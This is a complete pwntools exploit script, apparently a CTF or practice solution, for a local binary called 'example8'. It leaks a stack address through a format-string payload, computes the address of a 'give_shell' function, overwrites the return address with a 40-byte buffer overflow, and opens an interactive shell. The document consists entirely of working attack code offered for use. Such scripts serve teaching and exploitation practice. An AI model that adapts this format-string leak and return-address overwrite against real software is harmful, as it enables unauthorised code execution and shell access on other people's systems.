from pwn import *

e=ELF("./example8")
p=process("./example8")

p.recvuntil("Input1 > ")
p.sendline("%x."*11)
fsb_data = p.recvline()
datas = fsb_data.split(".")
print datas
code_addr = int(datas[10], 16)

log.info("vuln_ret_addr : "+hex(code_addr))

give_shell = code_addr - 0xee
log.info("give_shell : "+hex(give_shell))


p.recvuntil("Input2 > ")
p.send("A"*40+p32(give_shell))

log.info("Exploit!")
p.interactive()
